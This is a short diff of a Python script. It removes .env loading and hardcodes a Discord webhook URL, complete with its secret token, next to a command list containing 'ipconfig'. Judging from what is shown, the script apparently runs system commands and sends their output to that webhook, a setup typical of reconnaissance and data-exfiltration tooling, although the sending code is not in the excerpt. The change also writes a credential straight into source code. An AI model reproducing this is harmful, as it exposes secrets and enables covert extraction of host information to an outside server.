@@ -3,14 +3,8 @@ import requests
 from dotenv import load_dotenv
 import os
 
-env_path = os.path.join(os.path.dirname(__file__), ".env")
-if not os.path.exists(env_path):
-    print(f"Warning: .env file not found at {env_path}")
-else:
-    load_dotenv(env_path)
-
 # Discord webhook URL (replace with your actual webhook URL)
-WEBHOOK_URL = os.getenv('hook')
+WEBHOOK_URL = "https://discord.com/api/webhooks/1337920702132781147/wgLXRI50SrUnWattsHhSNN4rNhy9lAYbdFWmtxYMpup1Sy4ltZChSpfxqoBre7onR3sv"
 
 CMD = ['ipconfig']
 
